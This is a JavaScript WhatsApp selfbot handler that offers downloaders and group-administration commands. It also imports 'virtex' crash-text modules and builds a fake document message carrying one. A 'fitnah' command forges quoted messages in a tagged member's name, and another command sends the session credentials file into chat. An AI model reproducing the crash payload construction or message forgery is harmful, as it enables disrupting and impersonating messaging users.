
"use strict";
const { BufferJSON,
  WA_DEFAULT_EPHEMERAL,
  proto,
  prepareWAMessageMedia,
  areJidsSameUser,
  getContentType } = require('@adiwajshing/baileys')
const { downloadContentFromMessage,
  generateWAMessage,
  generateWAMessageFromContent,
  MessageType,
  buttonsMessage,
  relayWAMessage } = require("@adiwajshing/baileys")
const { exec, spawn } = require("child_process");
const { color, bgcolor, pickRandom, randomNomor } = require('./function/Data_Server_Bot/Console_Data')
const { removeEmojis, bytesToSize, getBuffer, fetchJson, getRandom, getGroupAdmins, runtime, sleep, makeid, isUrl, generateProfilePicture } = require("./function/func_Server");
const { TelegraPh, UploadFileUgu, AnonFiles } = require("./function/uploader_Media");
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./function/func_Addlist');
const { media_JSON, mess_JSON, setting_JSON, antilink_JSON, server_eror_JSON, welcome_JSON, db_respon_list_JSON, auto_downloadTT_JSON } = require('./function/Data_Location.js')
const { mediafireDl } = require('./function/scrape_Mediafire')
const { webp2mp4File } = require("./function/Webp_Tomp4")
const { cerpen } = require('./function/Search_Cerpen')
const { bioskop, bioskopNow, latinToAksara, aksaraToLatin, gempa, gempaNow, jadwalTV, listJadwalTV, jadwalsholat } = require('@bochilteam/scraper')
const { listmenu, ownermenu, listcerpen, listtextpro, listephoto, rulesBot, donasiBot, infoOwner } = require('./help')
const { jadibot, listJadibot } = require('./function/jadibot')

//scraper
const { instagram, music } = require("@xct007/frieren-scraper")

// database virtex
const { philips } = require('./function/virtex/philips')
const { virus } = require('./function/virtex/virus')
const { ngazap } = require('./function/virtex/ngazap')

const fs = require("fs");
const ms = require("ms");
const chalk = require('chalk');
const axios = require("axios");
const qs = require("querystring");
const fetch = require("node-fetch");
const colors = require('colors/safe');
const ffmpeg = require("fluent-ffmpeg");
const moment = require("moment-timezone");
const { Primbon } = require("scrape-primbon");
const primbon = new Primbon()
const util = require("util");
const { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter');

let medianya = []

// DB
const mess = mess_JSON
const setting = setting_JSON
const server_eror = server_eror_JSON
const welcomeJson = welcome_JSON
const db_respon_list = db_respon_list_JSON
const auto_downloadTT = auto_downloadTT_JSON

moment.tz.setDefault("Asia/Jakarta").locale("id");
module.exports = async (conn, msg, m, setting, store) => {
  try {
    const { type, quotedMsg, mentioned, now, fromMe, isBaileys } = msg
    if (msg.isBaileys) return
    const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
    const tanggal = moment().tz("Asia/Jakarta").format("ll")
    let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
    const ucapanWaktu = "Selamat " + dt.charAt(0).toUpperCase() + dt.slice(1)
    const content = JSON.stringify(msg.message)
    const from = msg.key.remoteJid
    const time = moment(new Date()).format("HH:mm");
    var chats = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type === 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type === 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type === 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type === 'buttonsResponseMessage') && quotedMsg.fromMe && msg.message.buttonsResponseMessage.selectedButtonId ? msg.message.buttonsResponseMessage.selectedButtonId : (type === 'templateButtonReplyMessage') && quotedMsg.fromMe && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : (type === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : (type == 'listResponseMessage') && quotedMsg.fromMe && msg.message.listResponseMessage.singleSelectReply.selectedRowId ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ""
    if (chats == undefined) { chats = '' }
    const prefix = '#'
    const isGroup = msg.key.remoteJid.endsWith('@g.us')
    const sender = isGroup ? (msg.key.participant ? msg.key.participant : msg.participant) : msg.key.remoteJid
    const isOwner = [`${setting.ownerNumber}`, "6281234795656@s.whatsapp.net", "6281234795656@s.whatsapp.net"].includes(sender) ? true : false
    const pushname = msg.pushName
    const body = chats.startsWith(prefix) ? chats : ''
    const args = body.trim().split(/ +/).slice(1);
    const q = args.join(" ");
    const isCommand = body.startsWith(prefix);
    const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
    const isCmd = isCommand ? body.slice(1).trim().split(/ +/).shift().toLowerCase() : null;
    const botNumber = conn.user.id.split(':')[0] + '@s.whatsapp.net'

    const groupMetadata = isGroup ? await conn.groupMetadata(from) : ''
    const groupName = isGroup ? groupMetadata.subject : ''
    const groupId = isGroup ? groupMetadata.id : ''
    const participants = isGroup ? await groupMetadata.participants : ''
    const groupMembers = isGroup ? groupMetadata.participants : ''
    const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
    const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
    const isGroupAdmins = groupAdmins.includes(sender)

    const isWelcome = isGroup ? welcomeJson.includes(from) : false
    const isAutoDownTT = auto_downloadTT.includes(from) ? true : false

    const quoted = msg.quoted ? msg.quoted : msg
    var dataGroup = (type === 'buttonsResponseMessage') ? msg.message.buttonsResponseMessage.selectedButtonId : ''
    var dataPrivate = (type === "messageContextInfo") ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : ''
    const isButton = dataGroup.length !== 0 ? dataGroup : dataPrivate
    var dataListG = (type === "listResponseMessage") ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : ''
    var dataList = (type === 'messageContextInfo') ? (msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId) : ''
    const isListMessage = dataListG.length !== 0 ? dataListG : dataList

    const isImage = (type == 'imageMessage')
    const isQuotedMsg = (type == 'extendedTextMessage')
    const isMedia = (type === 'imageMessage' || type === 'videoMessage');
    const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
    const isVideo = (type == 'videoMessage')
    const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
    const isSticker = (type == 'stickerMessage')
    const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false
    const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false

    const mentionByTag = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.mentionedJid : []
    const mentionByReply = type == "extendedTextMessage" && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.participant || "" : ""
    const mention = typeof (mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
    mention != undefined ? mention.push(mentionByReply) : []
    const mentionUser = mention != undefined ? mention.filter(n => n) : []

    try {
      var pp_user = await conn.profilePictureUrl(sender, 'image')
    } catch {
      var pp_user = 'https://i.ibb.co/0M6Hppv/3626e36344a1.jpg'
    }

    function mentions(teks, mems = [], id) {
      if (id == null || id == undefined || id == false) {
        let res = conn.sendMessage(from, { text: teks, mentions: mems })
        return res
      } else {
        let res = conn.sendMessage(from, { text: teks, mentions: mems }, { quoted: msg })
        return res
      }
    }

    function monospace(string) {
      return '```' + string + '```'
    }

    function parseMention(text = '') {
      return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
    }

    const virusnya = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {})
      },
      "message": {
        "documentMessage": {
          "url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
          "mimetype": "application/octet-stream",
          "fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
          "fileLength": "64455",
          "pageCount": 1,
          "mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
          "fileName": `Sedative-MD ${ngazap(prefix)}`,
          "fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
        }
      }
    }

    const q1 = q.split('&')[0];
    const q2 = q.split('&')[1];
    const q3 = q.split('&')[2];

    const isEmoji = (emo) => {
      let emoji_ranges = /(?:[\u2700-\u27bf]|(?:\ud83c[\udde6-\uddff]){2}|[\ud800-\udbff][\udc00-\udfff]|[\u0023-\u0039]\ufe0f?\u20e3|\u3299|\u3297|\u303d|\u3030|\u24c2|\ud83c[\udd70-\udd71]|\ud83c[\udd7e-\udd7f]|\ud83c\udd8e|\ud83c[\udd91-\udd9a]|\ud83c[\udde6-\uddff]|\ud83c[\ude01-\ude02]|\ud83c\ude1a|\ud83c\ude2f|\ud83c[\ude32-\ude3a]|\ud83c[\ude50-\ude51]|\u203c|\u2049|[\u25aa-\u25ab]|\u25b6|\u25c0|[\u25fb-\u25fe]|\u00a9|\u00ae|\u2122|\u2139|\ud83c\udc04|[\u2600-\u26FF]|\u2b05|\u2b06|\u2b07|\u2b1b|\u2b1c|\u2b50|\u2b55|\u231a|\u231b|\u2328|\u23cf|[\u23e9-\u23f3]|[\u23f8-\u23fa]|\ud83c\udccf|\u2934|\u2935|[\u2190-\u21ff])/g;
      let regexEmoji = new RegExp(emoji_ranges, 'gi');
      return emo.match(regexEmoji)
    }

    const reply = (teks) => { conn.sendMessage(from, { text: teks }, { quoted: msg }) }

    const adReply = async (teks, judul, isi, quo) => {
      conn.sendMessage(from, {
        text: teks,
        contextInfo: {
          "externalAdReply":
          {
            title: judul,
            body: isi,
            mediaType: 3, "thumbnail":
              fs.readFileSync('./sticker/thumb.jpg')
          }
        }
      },
        {
          sendEphemeral: true,
          quoted: quo
        })
    }

    const adReply2 = async (teks, pid, judul, isi, quo) => {
      await conn.sendMessage(from, {
        video: pid,
        gifPlayback: true,
        caption: teks,
        contextInfo: {
          forwardingScore: 9999,
          externalAdReply: {
            showAdAttribution: true,
            title: judul,
            body: isi,
            description: setting.group.judul,
            thumbnail: fs.readFileSync('./sticker/thumb.jpg'),
          }
        }
      }, { quoted: quo })
    }

    const ftokoo = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {}),
      },
      message: {
        productMessage: {
          product: {
            productImage: {
              mimetype: "image/jpeg",
              jpegThumbnail: fs.readFileSync('./sticker/thumb2.jpg'),
            },
            title: setting.botName,
            description: `${pushname}`,
            currencyCode: "USD",
            priceAmount1000: `6666666666`,
            retailerId: "Rafly",
            productImageCount: 1,
          },
          businessOwnerJid: `0@s.whatsapp.net`,
        },
      },
    };

    /*if (isGroup && isAntiLink) {
      if (!isBotGroupAdmins) return
      if (chats.includes('papale.markontol')) {
        reply(`\`\`\`「 Detect Link 」\`\`\`\n\nAnda tidak akan dikick bot karena yang anda kirim adalah link group yg ada di group ini`)
      } else if (isUrl(chats)) {
        let bvl = `\`\`\`「 Detect Link 」\`\`\`\n\nAdmin telah mengirim link, admin dibebaskan untuk mengirim link apapun`
        if (isGroupAdmins) return reply(bvl)
        if (fromMe) return reply(bvl)
        if (isOwner) return reply(bvl)
        await conn.sendMessage(from, { delete: msg.key })
        mentions(`「 ANTILINK 」\n\n@${sender.split('@')[0]} Kamu mengirim link group, maaf bot akan kick kamu dari grup`, [sender])
        await sleep(3000)
        conn.groupParticipantsUpdate(from, [sender], "remove")
      }
    }*/

    if (isAutoDownTT && fromMe) {
      if (chats.match(/(tiktok.com)/gi)) {
        reply('Url tiktok terdekteksi\nWait mengecek data url.')
        await sleep(3000)
        var tt_res = await fetchJson(`https://saipulanuar.ga/api/download/tiktok2?url=${chats}&apikey=jPHjZpQF`)
        reply(`𝗧𝗜𝗞𝗧𝗢𝗞 𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗

𝙅𝙪𝙙𝙪𝙡: ${tt_res.result.judul}
𝙎𝙤𝙪𝙧𝙘𝙚: ${chats}

Video sedang dikirim...`)
        conn.sendMessage(sender, { video: { url: tt_res.result.video.link1 }, caption: 'No Watermark!' }, { quotes: msg })
        if (isGroup) return conn.sendMessage(from, { text: 'Media sudah dikirim lewat chat pribadi bot.' }, { quoted: msg })
      }
    }

    if (!isCmd && isGroup && isAlreadyResponList(from, chats, db_respon_list)) {
      var get_data_respon = getDataResponList(from, chats, db_respon_list)
      if (get_data_respon.isImage === false) {
        adReply(sendResponList(from, chats, db_respon_list), groupName, tanggal, msg)
      } else {
        conn.sendMessage(from, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
          quoted: msg
        })
      }
    }

    const sendContact = (jid, numbers, name, quoted, mn) => {
      let number = numbers.replace(/[^0-9]/g, '')
      const vcard = 'BEGIN:VCARD\n'
        + 'VERSION:3.0\n'
        + 'FN:' + name + '\n'
        + 'ORG:;\n'
        + 'TEL;type=CELL;type=VOICE;waid=' + number + ':+' + number + '\n'
        + 'END:VCARD'
      return conn.sendMessage(from, { contacts: { displayName: name, contacts: [{ vcard }] }, mentions: mn ? mn : [] }, { quoted: quoted })
    }

    // Logs;
    if (!isGroup && isCmd && fromMe) {
      console.log(color('[PRIVATE]', 'cyan'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'white'), color(`${command} [${args.length}]`), 'from', color(pushname))
    }
    if (isGroup && isCmd && fromMe) {
      console.log(color('[GROUP]', 'green'), color(moment(msg.messageTimestamp * 1000).format('DD/MM/YYYY HH:mm:ss'), 'white'), color(`${command} [${args.length}]`), 'from', color(pushname), 'in', color(groupName))
    }

    if (chats.startsWith("Test") && fromMe) {
      var cptn = `*NOTHING HERE*\n\nJust simple selfbot with downloader feature:v\n\n`
      cptn += `*Runtime:* ${runtime(process.uptime())}`
      var vid = fs.readFileSync('./sticker/menu.mp4')
      adReply2(cptn, vid, `${tanggal}`, `${jam}`, ftokoo)
      console.log(color('[ STATUS CHECK ]', 'green'))
    }



    if (!fromMe) return
    switch (command) {

      case "id":
        reply(from)
        break

      case 'menu': case 'help':
        var cptn = `*NOTHING HERE*\n\nJust simple selfbot with downloader feature:v\n\n`
        cptn += `*Runtime:* ${runtime(process.uptime())}`
        var vid = fs.readFileSync('./sticker/menu.mp4')
        adReply2(cptn, vid, `${tanggal}`, `${jam}`, ftokoo)
        break

      case 'infobot':
      case 'info':
        adReply(`𝗕𝗢𝗧 𝗜𝗡𝗙𝗢
• Owner : ${setting.ownerName}
• Botname : ${setting.botName}
• Library : Baileys
• Runtime : ${runtime(process.uptime())}
`,
          `${tanggal}`, `${jam}`, ftokoo)
        break
      case 'runtime':
      case 'tes':
        reply(`*Runtime :* ${runtime(process.uptime())}`)
        break
      case 'infoowner':
      case 'ownerinfo': {
        reply(infoOwner)
      }
        break
      case 'owner':
        var owner_Nya = setting.ChatOwner
        sendContact(from, owner_Nya, setting.ownerName, msg)
        adReply('https://api.whatsapp.com/send/?phone=447466989823&text=Hai+orang+ganteng%3Av&type=phone_number&app_absent=0',
          'Rafly¹¹',
          'Creator of Sedative Selfbot',
          ftokoo)
        break

      // DOWNLOADER
      case 'pinterest':
        if (!q) return reply(`Contoh:\n${prefix + command} loli`)
        reply(mess.wait)
        fetchJson(`https://saipulanuar.ga/api/search/pinterest?query=${q}&apikey=jPHjZpQF`)
          .then(pin => {
            var media = pickRandom(pin.result)
            conn.sendMessage(from, { image: { url: media }, caption: `Done *${q}*` }, { quoted: msg })
          })
        break

      case 'instagram':
      case 'igdl':
      case 'ig':
        if (!q) return reply(`Contoh:\n${prefix + command} https://www.instagram.com/reel/Cs3wXG-goqR/?igshid=MzRlODBiNWFlZA==`)
        var data = await instagram.v1(`${q}`)
        var hasil = await getBuffer(data[0].url)
        if (/mp4/.test(hasil)) {
          await conn.sendMessage(from, { video: hasil, jpegThumbnail: fs.readFileSync('./sticker/thumb.jpg') })
        } else {
          await conn.sendMessage(from, { image: hasil, jpegThumbnail: fs.readFileSync('./sticker/thumb.jpg') })
        }
        break

      case 'ytmp3':
      case 'mp3':
        if (!q) return reply(`contoh\n${prefix + command} https://youtu.be/Pp2p4WABjos`)
        data = await fetchJson(`https://mfarels.my.id/api/ytmp3?url=${q}`)
        var aud = await getBuffer(data.url)
        adReply('_*Downloading...*_', data.title, data.channel)
        conn.sendMessage(from, { document: aud, mimetype: "audio/mp4", fileName: data.title }, { quoted: msg })
        break
      case 'ytmp4':
      case 'mp4':
        if (!q) return reply(`contoh\n${prefix + command} https://youtu.be/Pp2p4WABjos`)
        var data = await fetchJson(`https://mfarels.my.id/api/ytmp4?url=${q}`)
        adReply('_*Downloading...*_', data.title, data.channel)
        var vid = await getBuffer(data.url)
        conn.sendMessage(from, { video: vid, jpegThumbnail: fs.readFileSync('./sticker/thumb.jpg') }, { quoted: msg })
        break
      case 'tts': {
        if (!q) return reply(`Contoh:\n${prefix + command} hallo bro`)
        var tts = `https://saipulanuar.ga/api/text-to-audio/tts?text=${q}&idbahasa=id&apikey=jPHjZpQF`
        conn.sendMessage(sender, { audio: { url: tts }, mimetype: 'audio/mpeg', ptt: true }, { quoted: msg })
      }
        break
      case 'tiktok': {
        if (!q) return reply('contoh :\n#tiktok https://vt.tiktok.com/ZSRG695C8/')
        reply(mess.wait)
        fetchJson(`https://saipulanuar.ga/api/download/tiktok2?url=${q}&apikey=dyJhXvqe`)
          .then(tt_res => {
            reply(`𝗧𝗜𝗞𝗧𝗢𝗞 𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗
  
  𝙅𝙪𝙙𝙪𝙡: ${tt_res.result.judul}
  𝙎𝙤𝙪𝙧𝙘𝙚: ${q}
  
  Video sedang dikirim...`)
            conn.sendMessage(from, { video: { url: tt_res.result.video.link2 } }, { quotes: msg })
          }).catch((err) => {
            reply('Terjadi Kesalahan!!\nUrl tidak valid')
          })
      }
        break
      case 'mediafire':
        if (!q) return reply('*Contoh:*\n#mediafire https://www.mediafire.com/file/451l493otr6zca4/V4.zip/file')
        let isLinks = q.match(/(?:https?:\/{2})?(?:w{3}\.)?mediafire(?:com)?\.(?:com|be)(?:\/www\?v=|\/)([^\s&]+)/)
        if (!isLinks) return reply('Link yang kamu berikan tidak valid')
        reply('*Mengunduh Media...*')
        let baby1 = await mediafireDl(`${isLinks}`)
        if (baby1[0].size.split('MB')[0] >= 100) return reply('File Melebihi Batas ' + util.format(baby1))
        let result4 = `-----[ *MEDIAFIRE DOWNLOADER* ]-----

*Name* : ${baby1[0].nama}
*Size* : ${baby1[0].size}
*Type* : ${baby1[0].mime}

_Wait Mengirim file..._
`
        reply(result4)
        conn.sendMessage(from, { document: { url: baby1[0].link }, fileName: baby1[0].nama, mimetype: baby1[0].mime }, { quoted: msg }).catch((err) => reply('Gagal saat mendownload File'))
        break
      case 'grupbot':
      case 'groupbot':
        conn.sendMessage(from, { text: `${setting.group.judul}\n${setting.group.link}` }, { quoted: msg })
        break


      // OWNER FITUR

      case 'ownermenu':
        adReply(`${ownermenu(prefix)}`, 'OWNER MENU', setting.footer)
        break

      case 'resetlist':
        db_respon_list.splice('[]')
        fs.writeFileSync('./database/db_ListMessage', JSON.stringify(db_respon_list, null, 1))
        reply('Sukses Reset List Message')
        break

      case 'setmenu':
        if (isVideo || isQuotedVideo) {
          await conn.downloadAndSaveMediaMessage(msg, 'video', `./sticker/menu.mp4`)
        }
        reply('Done')
        break
      case 'setthumb':
        if (isImage || isQuotedImage) {
          await conn.downloadAndSaveMediaMessage(msg, 'image', `./sticker/thumb.jpg`)
        }
        reply('Done')
        break
      case 'setthumb2':
        if (isImage || isQuotedImage) {
          await conn.downloadAndSaveMediaMessage(msg, 'image', `./sticker/thumb2.jpg`)
        }
        reply('Done')
        break

      case 'mysesi': case 'sendsesi': case 'session': {
        reply('please wait..')
        await sleep(3000)

        // Read Database
        var sesi_bot = fs.readFileSync(`./sessions/creds.json`)

        // Sending Document
        conn.sendMessage(from, { document: sesi_bot, mimetype: 'document/application', fileName: 'session.json' }, { quoted: msg })
      }
        break


      case 'clear':
      case 'clearer':
      case 'clearerr': {
        server_eror.splice('[]')
        fs.writeFileSync('./database/func_error.json', JSON.stringify(server_eror))
        reply('Done')
      }
        break
      case 'error': {
        var teks = `*ERROR SERVER*\n_Total Tercatatat_ : ${server_eror.length}\n\n`
        var NO = 1
        for (let i of server_eror) {
          teks += `=> *ERROR (${NO++})*\n${i.error}\n\n`
        }
        reply(teks)
      }
        break
      case 'addrespon':
        var args1 = q.split("|")[0]
        var args2 = q.split("|")[1]
        if (!q.includes("|")) return reply(`Gunakan dengan cara ${command} *key|response*\n\n_Contoh_\n\n#${command} tes|apa`)
        if (isAlreadyResponList(from, args1, db_respon_list)) return reply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
        addResponList(from, args1, args2, false, '-', db_respon_list)
        reply(`Berhasil menambah List menu : *${args1}*`)
        break
      case 'delrespon':
        if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
        if (!q) return reply(`Gunakan dengan cara ${command} *key*\n\n_Contoh_\n\n${command} hello`)
        if (!isAlreadyResponList(from, q, db_respon_list)) return reply(`List respon dengan key *${q}* tidak ada di database!`)
        delResponList(from, q, db_respon_list)
        reply(`Sukses delete list message dengan key *${q}*`)
        break
      case 'update':
        var args1 = q.split("@")[0]
        var args2 = q.split("@")[1]
        if (!q.includes("@")) return reply(`Gunakan dengan cara #${command} *key@response*\n\n_Contoh_\n\n#${command} tes@apa`)
        if (!isAlreadyResponListGroup(from, db_respon_list)) return reply(`Maaf, untuk key *${args1}* belum terdaftar di group ini`)
        updateResponList(from, args1, args2, false, '-', db_respon_list)
        reply(`Berhasil update List menu : *${args1}*`)
      case 'setppbot':
        if (isImage && isQuotedImage) return reply(`Kirim gambar dengan caption *#setppbot* atau reply gambar yang sudah dikirim dengan pesan *#setppbot*`)
        await conn.downloadAndSaveMediaMessage(msg, "image", `./sticker/ppbot.jpg`)
        var media = `./sticker/ppbot.jpg`
        conn.updateProfilePicture(botNumber, { url: media })
        reply('Sukses Mengganti Profile Bot')
        await sleep(2000)
        fs.unlinkSync(media)
        break

      case 'fitnah':
        if (!isGroup) return reply(mess.OnlyGrup)
        if (!q) return reply(`Kirim perintah #*${command}* @tag|pesantarget|pesanbot`)
        var org = q.split("|")[0]
        var target = q.split("|")[1]
        var bot = q.split("|")[2]
        if (!org.startsWith('@')) return reply('Tag orangnya')
        if (!target) return reply(`Masukkan pesan target!`)
        if (!bot) return reply(`Masukkan pesan bot!`)
        var mens = parseMention(target)
        var msg1 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: from ? from : '' }, message: { extemdedTextMessage: { text: `${target}`, contextInfo: { mentionedJid: mens } } } }
        var msg2 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: from ? from : '' }, message: { conversation: `${target}` } }
        conn.sendMessage(from, { text: bot, mentions: mentioned }, { quoted: mens.length > 2 ? msg1 : msg2 })
        break

      case 'linkgrup': case 'linkgc':

        if (!isGroup) return reply(mess.OnlyGrup)
        if (!isBotGroupAdmins) return reply(mess.BotAdmin)
        var url = await conn.groupInviteCode(from).catch(() => reply(mess.error.api))
        url = 'https://chat.whatsapp.com/' + url
        reply(url)
        break
      case 'kick':
        if (!isGroup) return reply(mess.OnlyGrup)
        if (!isBotGroupAdmins) return reply(mess.BotAdmin)
        var number;
        if (mentionUser.length !== 0) {
          number = mentionUser[0]
          conn.groupParticipantsUpdate(from, [number], "remove")
        } else if (isQuotedMsg) {
          number = quotedMsg.sender
          conn.groupParticipantsUpdate(from, [number], "remove")
        } else {
          reply('Tag atau reply orang yg mau dikick\n\n*Contoh:* #kick @tag')
        }
        break
      case 'setppgrup': case 'setppgc':
        if (!isGroup) return reply(mess.OnlyGrup)
        if (!isGroupAdmins) return reply(mess.GrupAdmin)
        if (!isBotGroupAdmins) return reply(mess.BotAdmin)
        if (isImage && isQuotedImage) return reply(`Kirim gambar dengan caption *#bukti* atau reply gambar yang sudah dikirim dengan caption *#bukti*`)
        await conn.downloadAndSaveMediaMessage(msg, "image", `./transaksi/${sender.split('@')[0]}.jpg`)
        var media = `./transaksi/${sender.split('@')[0]}.jpg`
        await conn.updateProfilePicture(from, { url: media })
        await sleep(2000)
        reply('Sukses mengganti foto profile group')
        fs.unlinkSync(media)
        break
      case 'setnamegrup': case 'setnamegc':
        if (!isGroup) return reply(mess.OnlyGrup)
        if (!isBotGroupAdmins) return reply(mess.BotAdmin)
        if (!q) return reply(`Kirim perintah #${command} teks`)
        await conn.groupUpdateSubject(from, q)
          .then(res => {
            reply(`Sukses`)
          }).catch(() => reply(mess.error.api))
        break
      case 'setdesc': case 'setdescription':
        if (!isGroup) return reply(mess.OnlyGrup)
        if (!isBotGroupAdmins) return reply(mess.BotAdmin)
        if (!q) return reply(`Kirim perintah ${command} teks`)
        await conn.groupUpdateDescription(from, q)
          .then(res => {
            reply(`Sukses`)
          }).catch(() => reply(mess.error.api))
        break
      case 'group': case 'grup':
        if (!isGroup) return reply(mess.OnlyGrup)
        if (!isBotGroupAdmins) return reply(mess.BotAdmin)
        if (!q) return reply(`Kirim perintah #${command} _options_\nOptions : close & open\nContoh : #${command} close`)
        if (args[0] == "close") {
          conn.groupSettingUpdate(from, 'announcement')
          reply(`Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`)
        } else if (args[0] == "open") {
          conn.groupSettingUpdate(from, 'not_announcement')
          reply(`Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`)
        } else {
          reply(`Kirim perintah #${command} _options_\nOptions : close & open\nContoh : #${command} close`)
        }
        break
      case 'tagall':
        if (!q) return reply(`Teks?`)
        let teks_tagall = `══✪〘 *👥 Tag All* 〙✪══\n\n${q ? q : ''}\n\n`
        for (let mem of participants) {
          teks_tagall += `➲ @${mem.id.split('@')[0]}\n`
        }
        conn.sendMessage(from, { text: teks_tagall, mentions: participants.map(a => a.id) }, { quoted: msg })
        break
      case 'hidetag':
      case 'h':
        if (!isGroup) return reply(mess.OnlyGrup)
        let mem = [];
        groupMembers.map(i => mem.push(i.id))
        conn.sendMessage(from, { text: q ? q : '', mentions: mem })
        break
      case 'welcome': {
        if (!isGroup) return reply('Khusus Group!')
        if (!args[0]) return reply(`Kirim perintah #${command} _options_\nOptions : on & off\nContoh : #${command} on`)
        if (args[0] == 'ON' || args[0] == 'on' || args[0] == 'On') {
          if (isWelcome) return reply('Sudah aktif✓')
          welcomeJson.push(from)
          fs.writeFileSync('./database/welcome.json', JSON.stringify(welcomeJson))
          reply('Suksess mengaktifkan welcome di group:\n' + groupName)
        } else if (args[0] == 'OFF' || args[0] == 'OF' || args[0] == 'Of' || args[0] == 'Off' || args[0] == 'of' || args[0] == 'off') {
          welcomeJson.splice(from, 1)
          fs.writeFileSync('./database/welcome.json', JSON.stringify(welcomeJson))
          reply('Success menonaktifkan welcome di group:\n' + groupName)
        } else { reply('Kata kunci tidak ditemukan!') }
      }
        break

      case 'promote':
        if (!isGroup) return reply(mess.OnlyGrup)
        if (!isBotGroupAdmins) return reply(mess.BotAdmin)
        if (mentionUser.length !== 0) {
          conn.groupParticipantsUpdate(from, [mentionUser[0]], "promote")
            .then(res => { mentions(`Sukses menjadikan @${mentionUser[0].split("@")[0]} sebagai admin`, [mentionUser[0]], true) })
            .catch(() => reply(mess.error.api))
        } else if (isQuotedMsg) {
          conn.groupParticipantsUpdate(from, [quotedMsg.sender], "promote")
            .then(res => { mentions(`Sukses menjadikan @${quotedMsg.sender.split("@")[0]} sebagai admin`, [quotedMsg.sender], true) })
            .catch(() => reply(mess.error.api))
        } else {
          reply(`Tag atau balas pesan member yang ingin dijadikan admin\n\n*Contoh:*\n${prefix + command} @tag`)
        }
        break
      case 'tiktokauto': {
        if (!args[0]) return reply(`Kirim perintah #${command} _options_\nOptions : on & off\nContoh : #${command} on`)
        if (args[0] == 'ON' || args[0] == 'on' || args[0] == 'On') {
          if (isAutoDownTT) return reply('Auto download tiktok sudah aktif')
          auto_downloadTT.push(from)
          fs.writeFileSync('./database/tiktokDown.json', JSON.stringify(auto_downloadTT, null, 2))
          reply('Berhasil mengaktifkan auto download tiktok')
        } else if (args[0] == 'OFF' || args[0] == 'OF' || args[0] == 'Of' || args[0] == 'Off' || args[0] == 'of' || args[0] == 'off') {
          if (!isAutoDownTT) return reply('Auto download tiktok belum aktif')
          auto_downloadTT.splice(anu, 1)
          fs.writeFileSync('./database/tiktokDown.json', JSON.stringify(auto_downloadTT, null, 2))
          reply('Berhasil mematikan auto download tiktok')
        } else { reply('Kata kunci tidak ditemukan!') }
      }
        break
      case 'demote':
        if (!isGroup) return reply(mess.OnlyGrup)
        if (!isBotGroupAdmins) return reply(mess.BotAdmin)
        if (mentionUser.length !== 0) {
          conn.groupParticipantsUpdate(from, [mentionUser[0]], "demote")
            .then(res => { mentions(`Sukses menjadikan @${mentionUser[0].split("@")[0]} sebagai member biasa`, [mentionUser[0]], true) })
            .catch(() => reply(mess.error.api))
        } else if (isQuotedMsg) {
          conn.groupParticipantsUpdate(from, [quotedMsg.sender], "demote")
            .then(res => { mentions(`Sukses menjadikan @${quotedMsg.sender.split("@")[0]} sebagai member biasa`, [quotedMsg.sender], true) })
            .catch(() => reply(mess.error.api))
        } else {
          reply(`Tag atau balas pesan admin yang ingin dijadikan member biasa\n\n*Contoh:*\n${prefix + command} @tag`)
        }
        break
      case 'infogc':
      case 'infogrup':
      case 'infogroup':

        if (!isGroup) return reply(mess.OnlyGrup)
        let cekgcnya = `*INFO GROUP*
• *ID:* ${from}
• *Name:* ${groupName}
• *Member:* ${groupMembers.length}
• *Total Admin:* ${groupAdmins.length}
• *Welcome:* ${isWelcome ? "aktif" : "tidak"}
